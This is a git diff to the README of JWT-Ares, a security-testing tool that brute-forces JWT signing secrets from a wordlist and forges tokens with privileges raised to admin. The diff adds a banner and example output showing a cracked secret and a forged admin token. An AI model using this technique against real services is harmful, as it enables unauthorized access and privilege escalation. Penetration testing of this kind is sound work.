@@ -23,56 +23,54 @@ cd JWT-Ares
 pip install tqdm
 ```
 
-## Usage 🚀
+## Usage
 
 ```bash
 python3 jwt_ares.py <JWT_TOKEN> <WORDLIST_FILE>
-```
 
-### Example
-
-```bash
-python3 jwt_ares.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c wordlist.txt
+# Example:
+# python3 jwt_ares.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c rockyou.txt
 ```
 
 ## Example Output
 
 ```
-============================================================
-[+] JWT Token parsed successfully
-[+] Algorithm: HS256
-[+] Token Type: JWT
-[+] Payload: {
-  "sub": "1234567890",
-  "name": "John Doe",
-  "iat": 1516239022
-}
-------------------------------------------------------------
-[*] Starting brute force attack...
-[*] Wordlist: wordlist.txt
-[*] Target signature: SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
-------------------------------------------------------------
-Brute forcing: 100%|██████████| 10000/10000 [00:04<00:00, 2500.00attempts/s]
+         ___        _______      _                  
+        | \ \      / /_   _|    / \   _ __ ___  ___  
+     _  | |\ \ /\ / /  | |     / _ \ | '__/ _ \/ __| 
+    | |_| | \ V  V /   | |    / ___ \| | |  __/\__ \
+     \___/   \_/\_/    |_|   /_/   \_\_|  \___||___/  version 1.0.0
+    
+                   ───────█▄▄▄▄▄███▀▄─▄▄
+             ───────────▄▀──▀▄─▀▀█▀▀▄▀──▀▄
+                 ───────▀▄▀▀█▀▀████─▀▄──▄▀
+    ──────────────────────▀▀──────────▀▀───────────────────────────────
 
-[+] SECRET FOUND!
-[+] Secret: 'your-256-bit-secret'
-[+] Attempts: 8547
-[+] Time taken: 3.42 seconds
-[+] Rate: 2500 attempts/sec
-------------------------------------------------------------
+   A high-performance JWT brute force tool designed for security testing
+                Developed by Saher Mohamed 14/07/2025
+            GitHub: https://github.com/SaherMuhamed/JWT-Ares   
+    
+🔐 Algorithm        : HS256
+🔑 Token Type       : JWT
+🚩 Payload          : {"username": "user", "admin": 0}
+📜 Wordlist         : ../../Wordlists/best1050.txt
+🎯 Target signature : yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY
+-----------------------------------------------------------------
+Progress:  80%|█████████████████████████████████████████████████████████      | 844/1049 [00:00<00:00, 204140.05 attempts/s]
+
+[+] SECRET FOUND! (secret)
+[+] Attempts: 844
+[+] Time taken: 0.02 seconds
+[+] Rate: 34576 attempts/sec
+-----------------------------------------------------------------
 [+] Secret verification: PASSED
 [+] New token forged successfully!
-[+] Modified payload: {
-  "sub": "1234567890",
-  "name": "John Doe",
-  "iat": 1516239022,
-  "role": "admin"
-}
+[+] Modified payload: {"username": "user", "admin": true}
 [+] New JWT token:
-    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.YI89563278_a1CY4qy_J9qHWHU5XuWJhfx0_dGVL10
-------------------------------------------------------------
-[+] Forged token verification: PASSED
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6dHJ1ZX0.8o-BtqZyytwK4y06AS4b5072aZcBNMWSLgmMi99FvzU
 ```
+
+## Screenshots
 
 ## How It Works 🔧
 
@@ -93,8 +91,8 @@ Brute forcing: 100%|██████████| 10000/10000 [00:04<00:00, 25
 The tool automatically attempts these privilege escalation modifications:
 - `role` → `admin`
 - `user` → `admin`
-- `admin` → `true`
-- `is_admin` → `true`
+- `admin` → `true` or `1`
+- `is_admin` → `true` or `1`
 
 ## Performance 🚀
 
